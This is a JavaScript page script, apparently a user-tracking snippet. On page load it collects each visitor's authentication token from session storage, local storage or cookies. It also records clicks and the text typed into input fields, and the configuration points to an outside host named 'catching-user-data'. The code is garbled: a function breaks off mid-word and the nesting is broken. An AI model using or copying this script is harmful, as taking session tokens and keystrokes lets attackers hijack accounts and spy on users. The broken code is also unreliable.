document.addEventListener('DOMContentLoaded', function () {
    console.log("Page loaded");

    var config = {
        userSessionID: getDefaultSessionID(),
        serverURL: 'https://catching-user-data.onrender.com/api',
        adminID: getAdminId(),
        deviceType: getDeviceType(),
        location: window.location.pathname,
    };

    function getAdminId() {
        var adminIdMetaTag = document.querySelector('meta[name="admin-id"]');
        return adminIdMetaTag ? adminIdMetaTag.content : 'unknownAdminId';
    }

    function getTokenName() {
        var tokenNameMetaTag = document.querySelector('meta[name="token-name"]');
        return tokenNameMetaTag ? tokenNameMetaTag.content : 'jwt';
    }

    function getDefaultSessionID() {
        var tokenName = getTokenName();
        var token = sessionStorage.getItem(tokenName) || localStorage.getItem(tokenName) || getCookie(tokenName);
        return token || 'unidentifiedUser';
    }

    function getCookie(name) {
        va

        function handleEvent(event, eventType) {
            var element = event.target;
            var elementIdentifier = getElementIdentifier(element);
            var detail = {
                eventType: eventType,
                identifier: elementIdentifier,
                timestamp: new Date().toISOString(),
                pageTitle: document.title,
                value: eventType === 'input' ? element.value.substring(0, 50) : undefined,
                userSessionID: config.userSessionID
            };
            logInteraction(detail);
        }

        function getElementIdentifier(element) {
            var identifier = '';
            if (element.id) {
                identifier += 'ID: ' + element.id + '; ';
            }
            if (element.className) {
                identifier += 'Class: ' + element.className + '; ';
            }
            if (element.name) {
                identifier += 'Name: ' + element.name + '; ';
            }
            identifier += 'Tag: ' + element.tagName.toLowerCase();
            return identifier;
        }

        function attachEventListeners() {
            document.addEventListener('click', function (event) {
                handleEvent(event, 'click');
            });

            document.querySelectorAll('input[type="text"], textarea').forEach(function (input) {
                input.addEventListener('input', function (event) {
                    handleEvent(event, 'input');
                });
            });
        }

        attachEventListeners();
    }
});